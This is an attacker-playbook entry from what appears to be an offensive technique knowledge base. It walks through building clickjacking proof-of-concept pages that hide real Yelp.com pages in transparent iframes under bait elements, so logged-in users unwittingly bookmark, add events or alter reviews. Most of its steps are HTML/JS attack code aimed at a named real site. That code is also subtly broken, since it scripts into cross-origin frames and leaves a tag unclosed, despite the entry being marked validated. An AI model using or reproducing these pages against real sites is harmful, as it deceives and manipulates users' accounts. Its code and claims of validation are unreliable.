---
tags:
  - clickjacking-poc
  - ui-overlay
  - web-exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[User Execution]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.680Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 9ecf493d-a131-47c5-a8c4-b1b4bd3b26c7
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[User Execution]]'
  - '[[Drive-by Compromise]]'
---
# Create-Proof-of-Concept-for-Clickjacking-Attacks

## Summary

This procedure builds HTML-based proof-of-concept pages that embed vulnerable Yelp.com content in iframes and use overlays to hijack user clicks, simulating attacks like unwanted bookmarking or review manipulation.

## Description

Once frammable pages are identified, PoCs demonstrate practical exploitation by loading Yelp UI in semi-transparent or hidden iframes and positioning clickable elements (e.g., buttons, images) over sensitive controls. This tricks users into actions such as bookmarking a strip club, adding fake events, or changing review ratings, leading to account defacement or privacy breaches. PoCs are local HTML files requiring no server-side changes, relying on client-side positioning and z-index for deception.

## Requirements

1. Text editor (e.g., VS Code) for HTML/JS
2. Browser supporting iframes and JS
3. List of vulnerable Yelp URLs from prior discovery

## Defense

Defensive measures and detection strategies:

- Audit all endpoints for frame protection
- Use JavaScript frame-busting scripts as fallback
- Log and alert on cross-origin iframe attempts

## Objectives

1. Construct deceptive UI overlays
2. Verify click hijacking on Yelp actions
3. Prepare for impact demonstration

## Instructions

### Step 1: Build Basic Iframe PoC

**Context**: Create an HTML file embedding a Yelp page with partial transparency.

Save as hack.html:

```html
<!DOCTYPE html>
<html>
<body style="margin:0;">
<iframe id="frame" src="https://www.yelp.com/biz/bookmark-url" style="opacity:0.5; position:absolute;"></iframe>
<img src="bait-image.jpg" onclick="document.getElementById('frame').contentDocument.querySelector('.bookmark-btn').click();" style="position:relative; z-index:1;">
</body>
</html>
```

Load in browser.

> Overlay image click triggers hidden bookmark.

### Step 2: Add Transparent Overlay

**Context**: Make iframe invisible and align overlay precisely.

Update hack.html with CSS for full transparency:

```html
<iframe id="frame" src="https://www.yelp.com/events/add" style="opacity:0; width:100%; height:100%; position:fixed;">
<button id="fakebtn" style="position:fixed; top:200px; left:300px;">Win Prize!</button>
<script>document.getElementById('fakebtn').onclick = () => { document.getElementById('frame').contentDocument.querySelector('.add-event').click(); };</script>
```

> Click simulates event addition without visible Yelp.

### Step 3: Test with Authenticated Session

**Context**: Log into Yelp in the browser and interact with PoC.

Open PoC with logged-in tab, click overlays, verify actions in Yelp account.

> Confirm changes like added events or edited ratings.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[User Execution]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[poc-creation]]
